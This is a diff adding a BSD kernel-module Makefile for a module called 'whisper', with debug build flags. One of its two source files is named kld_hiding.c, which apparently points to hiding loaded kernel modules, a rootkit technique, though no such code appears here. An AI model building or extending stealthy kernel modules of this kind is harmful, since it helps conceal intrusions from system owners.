@@ -1,0 +1,15 @@
+.PATH: ${.CURDIR}/src/
+.OBJDIR: ${.CURDIR}/obj/
+PACKAGE=whisper
+# START DEBUG MODE
+DEBUG_FLAGS=-g
+COPTFLAGS=-O0
+CFLAGS=-O0 -pipe
+CFLAGS+=-DDEBUG
+# END DEBUG MODE
+FILESDIR=.
+KMOD=whisper
+SRCS=whisper.c kld_hiding.c
+CFLAGS+=-DVIMAGE
+
+.include <bsd.kmod.mk>
